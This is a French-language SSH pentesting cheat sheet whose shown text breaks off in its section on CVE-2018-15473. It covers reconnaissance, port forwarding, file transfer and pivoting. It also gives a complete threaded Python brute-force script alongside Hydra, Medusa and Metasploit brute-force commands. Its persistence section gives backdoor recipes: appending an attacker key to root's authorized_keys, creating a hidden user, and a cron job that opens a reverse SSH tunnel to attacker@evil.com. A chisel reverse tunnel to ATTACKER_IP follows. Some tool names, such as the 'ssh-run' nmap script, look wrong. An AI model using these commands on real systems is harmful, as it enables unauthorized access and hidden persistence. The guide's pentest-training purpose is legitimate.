# 🔐 SSH - Guide Complet

Guide exhaustif pour l'énumération, l'exploitation, le pivoting et la sécurisation des services SSH, l'outil essentiel pour l'administration et le post-exploitation.

---

## 📖 Concepts de Base

### Qu'est-ce que SSH ?

Le **Secure Shell (SSH)** est un protocole cryptographique pour l'accès distant sécurisé. En pentesting, SSH est crucial pour :
- Accès post-exploitation
- Pivoting réseau (tunnels, SOCKS proxy)
- Transfert de fichiers sécurisé (SCP, SFTP)
- Port forwarding (local, remote, dynamic)
- Brute force d'authentification
- Exploitation de vulnérabilités (rare mais critique)

**Port SSH** :
```
22      - SSH (défaut)
2222    - Alternative courante
```

**Méthodes d'authentification** :
```
Password        - Mot de passe
Public Key      - Clé RSA/ECDSA/Ed25519
Keyboard-Interactive
Host-based
GSSAPI
```

---

## 1️⃣ Reconnaissance et Scan

### Détection de service

**Nmap** :
```bash
# Scan basique
nmap -p 22 target.com

# Scan avec version
nmap -p 22 -sV target.com

# Scan complet SSH
nmap -p 22 -sV -sC target.com

# Scripts SSH
nmap -p 22 --script ssh-* target.com

# Output
nmap -p 22 -sV -sC -oA ssh_scan target.com
```

**Scripts Nmap SSH** :
```bash
# Host key
nmap -p 22 --script ssh-hostkey target.com

# Auth methods
nmap -p 22 --script ssh-auth-methods target.com

# Algorithmes
nmap -p 22 --script ssh2-enum-algos target.com

# Brute force
nmap -p 22 --script ssh-brute target.com

# Run (CVE-2018-15473)
nmap -p 22 --script ssh-run target.com
```

**Banner Grabbing** :
```bash
# Netcat
nc target.com 22

# Nmap
nmap -p 22 -sV --script banner target.com

# SSH direct
ssh -V target.com

# Telnet
telnet target.com 22
```

---

### Énumération du serveur

**Identifier version** :
```bash
# Banner
nc target.com 22
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5

# SSH client
ssh -v target.com
# debug1: Remote protocol version 2.0, remote software version OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
```

**Algorithmes supportés** :
```bash
# Nmap
nmap -p 22 --script ssh2-enum-algos target.com

# SSH manuel
ssh -Q cipher
ssh -Q mac
ssh -Q kex
ssh -Q key
```

**Méthodes d'authentification** :
```bash
# Nmap
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" target.com

# SSH manuel
ssh -o PreferredAuthentications=none target.com
```

---

## 2️⃣ Connexion SSH

### Connexion basique

```bash
# Connexion simple
ssh user@target.com

# Port custom
ssh -p 2222 user@target.com

# Verbose (debug)
ssh -v user@target.com
ssh -vv user@target.com
ssh -vvv user@target.com

# Désactiver strict host key checking
ssh -o StrictHostKeyChecking=no user@target.com

# Désactiver user known hosts
ssh -o UserKnownHostsFile=/dev/null user@target.com

# Combiné (utile en pentest)
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@target.com
```

---

### Authentification par clé

**Générer clé SSH** :
```bash
# RSA
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa

# Ed25519 (recommandé)
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519

# ECDSA
ssh-keygen -t ecdsa -b 521 -f ~/.ssh/id_ecdsa

# Sans passphrase (dangereux mais utile en pentest)
ssh-keygen -t ed25519 -f pentest_key -N ""
```

**Connexion avec clé** :
```bash
# Spécifier clé privée
ssh -i ~/.ssh/id_rsa user@target.com

# Permissions correctes requises
chmod 600 ~/.ssh/id_rsa

# Clé avec passphrase
ssh -i ~/.ssh/id_rsa user@target.com
# Enter passphrase: ****
```

**Ajouter clé publique** :
```bash
# Méthode 1: ssh-copy-id
ssh-copy-id -i ~/.ssh/id_rsa.pub user@target.com

# Méthode 2: manuelle
cat ~/.ssh/id_rsa.pub | ssh user@target.com "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"

# Méthode 3: SCP
scp ~/.ssh/id_rsa.pub user@target.com:~/.ssh/authorized_keys

# Permissions correctes
ssh user@target.com "chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys"
```

---

## 3️⃣ Brute Force

### Hydra

```bash
# User connu
hydra -l root -P passwords.txt ssh://target.com

# Liste d'utilisateurs
hydra -L users.txt -P passwords.txt ssh://target.com

# Port custom
hydra -l root -P passwords.txt ssh://target.com:2222

# Threads
hydra -l root -P passwords.txt -t 4 ssh://target.com

# Verbose
hydra -l root -P passwords.txt -V ssh://target.com

# Output
hydra -l root -P passwords.txt ssh://target.com -o ssh_creds.txt

# Stop on first success
hydra -l root -P passwords.txt -f ssh://target.com
```

---

### Medusa

```bash
# Basic brute force
medusa -h target.com -u root -P passwords.txt -M ssh

# Multiple users
medusa -h target.com -U users.txt -P passwords.txt -M ssh

# Threads
medusa -h target.com -u root -P passwords.txt -M ssh -t 10

# Verbose
medusa -h target.com -u root -P passwords.txt -M ssh -v 6

# Output
medusa -h target.com -u root -P passwords.txt -M ssh -O ssh_results.txt
```

---

### Ncrack

```bash
# Brute force
ncrack -p 22 -u root -P passwords.txt target.com

# Multiple targets
ncrack -p 22 -U users.txt -P passwords.txt target1.com target2.com

# Connection limit
ncrack -p 22 -u root -P passwords.txt --connection-limit 2 target.com

# Timing
ncrack -p 22 -u root -P passwords.txt -T 4 target.com
```

---

### Metasploit

```bash
msfconsole

# SSH login scanner
use auxiliary/scanner/ssh/ssh_login
set RHOSTS target.com
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run

# SSH login with user file
use auxiliary/scanner/ssh/ssh_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# SSH enumeration
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS target.com
set USER_FILE users.txt
run
```

---

### Script Python

```python
#!/usr/bin/env python3
# ssh_brute.py

import paramiko
import sys
from concurrent.futures import ThreadPoolExecutor

def try_login(host, port, user, password):
    """Essaie une combinaison user/password"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=user, password=password, timeout=5, banner_timeout=5)
        ssh.close()
        return (user, password, True)
    except paramiko.AuthenticationException:
        return (user, password, False)
    except Exception as e:
        return (user, password, False)

def brute_force(host, port, users, passwords, threads=10):
    """Brute force SSH"""
    
    print(f"[*] Starting SSH brute force on {host}:{port}")
    print(f"[*] Users: {len(users)}, Passwords: {len(passwords)}")
    print(f"[*] Total attempts: {len(users) * len(passwords)}\n")
    
    attempts = []
    for user in users:
        for password in passwords:
            attempts.append((host, port, user.strip(), password.strip()))
    
    found = []
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        results = executor.map(lambda x: try_login(*x), attempts)
        
        for user, password, success in results:
            if success:
                print(f"[+] SUCCESS: {user}:{password}")
                found.append((user, password))
    
    return found

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <host> <port> <users_file> <passwords_file>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    with open(sys.argv[3]) as f:
        users = f.readlines()
    
    with open(sys.argv[4]) as f:
        passwords = f.readlines()
    
    results = brute_force(host, port, users, passwords)
    
    if results:
        print(f"\n[+] Found {len(results)} valid credentials")
    else:
        print("\n[-] No valid credentials found")
```

---

## 4️⃣ Port Forwarding & Tunneling

### Local Port Forwarding

**Principe** : Accéder à un service distant via la machine SSH.

```bash
# Syntax
ssh -L [local_port]:[target_host]:[target_port] user@ssh_server

# Exemple: Accéder à MySQL sur un serveur distant
ssh -L 3306:127.0.0.1:3306 user@target.com

# Puis localement
mysql -h 127.0.0.1 -P 3306 -u root -p

# Exemple: Accéder à un service interne
ssh -L 8080:internal-server:80 user@target.com

# Puis dans navigateur
http://localhost:8080

# Multiple port forwards
ssh -L 3306:db.local:3306 -L 8080:web.local:80 user@target.com

# Bind to all interfaces (dangereux)
ssh -L 0.0.0.0:3306:127.0.0.1:3306 user@target.com
```

---

### Remote Port Forwarding

**Principe** : Exposer un port local sur le serveur SSH distant.

```bash
# Syntax
ssh -R [remote_port]:[local_host]:[local_port] user@ssh_server

# Exemple: Exposer service local sur serveur distant
ssh -R 8080:127.0.0.1:80 user@target.com

# Sur le serveur distant, accès via
curl http://localhost:8080

# Reverse shell listener
ssh -R 4444:127.0.0.1:4444 user@target.com

# Sur serveur distant
nc localhost 4444  # Se connecte au listener local

# Exposer sur toutes interfaces (nécessite GatewayPorts yes)
ssh -R 0.0.0.0:8080:127.0.0.1:80 user@target.com
```

---

### Dynamic Port Forwarding (SOCKS Proxy)

**Principe** : Créer un proxy SOCKS pour router tout le trafic.

```bash
# Créer SOCKS proxy
ssh -D 1080 user@target.com

# Configurer proxychains
# /etc/proxychains4.conf
socks5 127.0.0.1 1080

# Utiliser avec n'importe quel outil
proxychains nmap -sT 10.0.0.0/24
proxychains curl http://internal-server
proxychains firefox

# Avec Firefox
# Preferences > Network Settings > Manual proxy
# SOCKS Host: 127.0.0.1
# Port: 1080
# SOCKS v5

# Avec Chrome
google-chrome --proxy-server="socks5://127.0.0.1:1080"

# Bind sur toutes interfaces
ssh -D 0.0.0.0:1080 user@target.com
```

---

### Jump Host / Bastion

```bash
# ProxyJump (OpenSSH 7.3+)
ssh -J bastion.com target.com

# Multiple jumps
ssh -J bastion1.com,bastion2.com target.com

# Avec utilisateurs différents
ssh -J user1@bastion.com user2@target.com

# ProxyCommand (ancienne méthode)
ssh -o ProxyCommand="ssh -W %h:%p bastion.com" target.com

# Via nc
ssh -o ProxyCommand="nc -x 127.0.0.1:1080 %h %p" target.com

# Configuration ~/.ssh/config
Host target
    HostName target.com
    User targetuser
    ProxyJump bastion.com

Host bastion
    HostName bastion.com
    User bastionuser

# Puis simplement
ssh target
```

---

## 5️⃣ Transfert de Fichiers

### SCP (Secure Copy)

```bash
# Local vers distant
scp file.txt user@target.com:/tmp/

# Distant vers local
scp user@target.com:/tmp/file.txt ./

# Récursif
scp -r /local/dir user@target.com:/remote/dir

# Port custom
scp -P 2222 file.txt user@target.com:/tmp/

# Avec clé
scp -i ~/.ssh/id_rsa file.txt user@target.com:/tmp/

# Verbose
scp -v file.txt user@target.com:/tmp/

# Préserver permissions
scp -p file.txt user@target.com:/tmp/

# Via jump host
scp -o "ProxyJump=bastion.com" file.txt user@target.com:/tmp/
```

---

### SFTP

```bash
# Connexion interactive
sftp user@target.com

# Commandes SFTP
sftp> ls                    # Liste remote
sftp> lls                   # Liste local
sftp> pwd                   # Répertoire remote
sftp> lpwd                  # Répertoire local
sftp> cd /path              # Changer répertoire remote
sftp> lcd /path             # Changer répertoire local
sftp> get file.txt          # Download
sftp> put file.txt          # Upload
sftp> mget *.txt            # Download multiple
sftp> mput *.txt            # Upload multiple
sftp> mkdir dir             # Créer répertoire
sftp> rmdir dir             # Supprimer répertoire
sftp> rm file.txt           # Supprimer fichier
sftp> quit                  # Quitter

# Batch mode
sftp -b commands.txt user@target.com

# commands.txt
cd /tmp
put file.txt
get remote_file.txt
quit
```

---

### rsync over SSH

```bash
# Sync local vers distant
rsync -avz -e ssh /local/dir/ user@target.com:/remote/dir/

# Sync distant vers local
rsync -avz -e ssh user@target.com:/remote/dir/ /local/dir/

# Avec port custom
rsync -avz -e "ssh -p 2222" /local/dir/ user@target.com:/remote/dir/

# Avec progress
rsync -avz --progress -e ssh /local/dir/ user@target.com:/remote/dir/

# Dry run (test)
rsync -avzn -e ssh /local/dir/ user@target.com:/remote/dir/

# Delete files in destination
rsync -avz --delete -e ssh /local/dir/ user@target.com:/remote/dir/
```

---

## 6️⃣ Persistence

### SSH Keys Backdoor

```bash
# Sur la cible (après compromission)
# Générer clé sur attaquant
ssh-keygen -t ed25519 -f backdoor_key -N ""

# Ajouter clé publique sur cible
echo "ssh-ed25519 AAAA...attacker backdoor" >> ~/.ssh/authorized_keys

# Ou pour root
echo "ssh-ed25519 AAAA...attacker backdoor" >> /root/.ssh/authorized_keys

# Permissions
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Connexion depuis attaquant
ssh -i backdoor_key user@target.com
```

---

### SSH Config Backdoor

```bash
# /etc/ssh/sshd_config modifications

# Activer password auth (si désactivé)
PasswordAuthentication yes

# Permettre root login
PermitRootLogin yes

# Backdoor user
# Créer user caché
useradd -m -s /bin/bash .apache
echo ".apache:password123" | chpasswd

# Connexion
ssh .apache@target.com
```

---

### Authorized Keys avec from restriction bypass

```bash
# Dans ~/.ssh/authorized_keys
# Normal (restricted)
from="10.0.0.1" ssh-rsa AAAA... user@host

# Backdoor (bypass)
ssh-rsa AAAA... attacker@evil
# Pas de restriction from= !
```

---

### Cron Job SSH Reverse

```bash
# Sur la cible
# Reverse SSH tunnel permanent
echo "*/5 * * * * ssh -R 2222:localhost:22 attacker@evil.com -N -f" | crontab -

# Sur attaquant
# Connexion via tunnel
ssh -p 2222 user@localhost
```

---

## 7️⃣ Pivoting Avancé

### SSHuttle (VPN over SSH)

```bash
# Installation
apt install sshuttle

# Route tout le trafic via SSH
sshuttle -r user@target.com 0.0.0.0/0

# Sous-réseau spécifique
sshuttle -r user@target.com 10.0.0.0/24

# Multiple subnets
sshuttle -r user@target.com 10.0.0.0/24 192.168.1.0/24

# Exclude IPs
sshuttle -r user@target.com 0.0.0.0/0 -x 8.8.8.8

# DNS via tunnel
sshuttle -r user@target.com 0.0.0.0/0 --dns

# Verbose
sshuttle -r user@target.com 10.0.0.0/24 -vv
```

---

### Metasploit SSH Pivoting

```bash
msfconsole

# Get meterpreter session first
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
exploit

# From meterpreter
background

# Add route
route add 10.0.0.0/24 session_id

# Ou autoroute
use post/multi/manage/autoroute
set SESSION session_id
run

# Port forward
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run

# Configurer proxychains
proxychains nmap -sT 10.0.0.10
```

---

### Chisel (HTTP Tunnel)

```bash
# Installation
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
chmod +x chisel_1.8.1_linux_amd64
mv chisel_1.8.1_linux_amd64 chisel

# Sur attaquant (serveur)
./chisel server -p 8080 --reverse

# Sur cible (client)
./chisel client ATTACKER_IP:8080 R:2222:localhost:22
# Forward SSH de la cible vers port 2222 de l'attaquant

# Connexion
ssh -p 2222 user@localhost

# SOCKS proxy
./chisel client ATTACKER_IP:8080 R:socks
# Crée proxy SOCKS sur port 1080 de l'attaquant
```

---

## 8️⃣ Exploitation de Vulnérabilités

### User Enumeration (CVE-2018-15473)

```bash
# Nmap script
nmap -p 22 --script ssh-run --script-args ssh-run.cmd="ls" target.com

# Python exploit
git clone https://github.com/ejedev/sshUsernames
